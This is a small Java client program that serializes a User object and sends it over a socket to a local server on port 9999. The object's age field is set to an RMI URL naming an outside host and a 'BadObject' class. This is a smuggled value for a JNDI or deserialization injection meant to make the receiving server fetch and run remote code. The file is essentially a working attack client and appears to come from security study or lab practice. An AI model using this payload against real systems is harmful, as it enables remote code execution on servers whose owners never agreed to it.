import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.Socket;

public class client {
    public static void main(String[] args) {
        User user = new User();
        user.setUsername("guowei");
        user.setAge("rmi://121.196.109.163:7888/#BadObject");
        Socket socket = null;
        try {
            socket = new Socket("127.0.0.1",9999);
            System.out.println("sent Object to 服务器");
            ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
            oos.writeObject(user);
            oos.flush();
            socket.close();
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
}
